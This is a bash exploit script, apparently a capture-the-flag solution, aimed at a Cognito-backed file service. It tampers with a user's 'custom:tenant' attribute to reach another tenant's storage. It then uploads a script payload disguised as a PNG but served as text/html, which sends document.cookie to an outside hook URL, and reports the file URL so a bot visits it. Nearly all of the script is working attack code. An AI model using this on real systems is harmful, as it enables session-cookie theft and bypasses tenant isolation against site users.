C_USERNAME="azaraShi_23"
PASSWORD="admin12#WRONG"
CLIENT_ID="" # set your client id
API_URL="https://api.example.test/v1" # set your api url
FRONTEND_URL="https://example.test" # set your frontend url
HOOK_URL="" # set your hook url

RESPONSE=$(curl -X POST \
  -H "Content-Type: application/json" \
  -d "{\"name\": \"${C_USERNAME}\"}"\
  $API_URL/signup)

if [ $(echo $RESPONSE | jq -r '.temporaryPassword') != "null" ]; then
  echo "temporary password: $(echo $RESPONSE | jq -r '.temporaryPassword')"
  SESSION=$(aws cognito-idp initiate-auth \
    --auth-flow USER_PASSWORD_AUTH \
    --client-id $CLIENT_ID \
    --auth-parameters USERNAME=$C_USERNAME,PASSWORD=$(echo $RESPONSE | jq -r '.temporaryPassword') \
    --region ap-northeast-1 \
    --no-sign-request | jq -r '.Session')

  aws cognito-idp respond-to-auth-challenge \
    --client-id $CLIENT_ID \
    --challenge-name NEW_PASSWORD_REQUIRED \
    --challenge-responses USERNAME=$C_USERNAME,NEW_PASSWORD=$PASSWORD \
    --session $SESSION \
    --region ap-northeast-1 \
    --no-sign-request
fi

TOKENS=$(aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id $CLIENT_ID \
  --auth-parameters USERNAME=$C_USERNAME,PASSWORD=$PASSWORD \
  --region ap-northeast-1 \
  --no-sign-request)

ACCESS_TOKEN=$(echo $TOKENS | jq -r '.AuthenticationResult.AccessToken')

aws cognito-idp update-user-attributes \
  --user-attributes Name="custom:tenant",Value="assets" \
  --access-token $ACCESS_TOKEN \
  --region ap-northeast-1 \
  --no-sign-request

TOKENS=$(aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id $CLIENT_ID \
  --auth-parameters USERNAME=$C_USERNAME,PASSWORD=$PASSWORD \
  --region ap-northeast-1 \
  --no-sign-request)

ID_TOKEN=$(echo $TOKENS | jq -r '.AuthenticationResult.IdToken')
ACCESS_TOKEN=$(echo $TOKENS | jq -r '.AuthenticationResult.AccessToken')

mkdir -p tmp
echo "
<script>
  (
    async()=> {
      await fetch(\`https://$HOOK_URL/?\${document.cookie}\`) 
    }
  )()
</script>" > tmp/test.png
SIZE=$(wc -c tmp/test.png | awk '{print $1}')
UPLOAD_URL=$(curl -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -d "{\"name\": \"test.png\", \"contentType\": \"image/png\", \"size\": ${SIZE}}" \
  $API_URL/box/signed-url/put | jq -r '.url' )

curl -X PUT \
  -H "Content-Type: text/html" \
  --upload-file tmp/test.png \
  $UPLOAD_URL

FILE_ID=$(echo $UPLOAD_URL | awk -F '/' '{print $NF}' | awk -F '?' '{print $1}')
echo "file id: $FILE_ID"

curl $(curl -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -d "{\"name\": \"$FILE_ID\"}" \
  $API_URL/box/signed-url/get | jq -r '.signedUrl')

curl -XPOST \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"$FRONTEND_URL/assets/$FILE_ID\"}" \
  $API_URL/report

sleep 5

curl $(curl -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -d "{\"name\": \"$FILE_ID\"}" \
  $API_URL/box/signed-url/delete | jq -r '.signedUrl') \
  -XDELETE

curl $(curl -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -d "{\"name\": \"$FILE_ID\"}" \
  $API_URL/box/signed-url/get | jq -r '.signedUrl')
